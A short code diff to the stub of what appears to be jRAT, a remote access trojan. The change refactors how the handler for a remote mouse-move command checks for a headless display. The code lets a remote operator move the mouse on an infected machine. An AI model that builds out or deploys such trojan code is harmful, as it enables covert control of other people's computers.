@@ -1,5 +1,6 @@
 package se.jrat.stub.packets.incoming;
 
+import se.jrat.common.utils.Utils;
 import se.jrat.stub.Connection;
 import se.jrat.stub.utils.ScreenUtils;
 
@@ -11,7 +12,7 @@ public class Packet91MouseMove extends AbstractIncomingPacket {
 		int y = con.readInt();
 		int monitor = con.readInt();
 		
-		if (!ScreenUtils.isHeadless()) {
+		if (!Utils.isHeadless()) {
 			if (monitor == -1) {
 				ScreenUtils.getDefault().mouseMove(x, y);
 			} else {
